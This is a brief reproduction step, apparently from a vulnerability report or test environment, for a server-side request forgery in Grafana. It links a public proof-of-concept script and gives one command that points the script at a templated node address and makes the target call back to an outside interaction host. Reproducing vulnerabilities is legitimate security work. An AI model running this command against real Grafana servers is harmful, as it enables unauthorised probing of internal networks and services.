    Vulnerability Reproduce

    Use this POC: https://github.com/RandomRobbieBF/grafana-ssrf to reproduce the SSRF:

    ```
    python grafana-ssrf.py -H http://{{NODE_IP}}:3000 -u http://example.interact.sh/attack
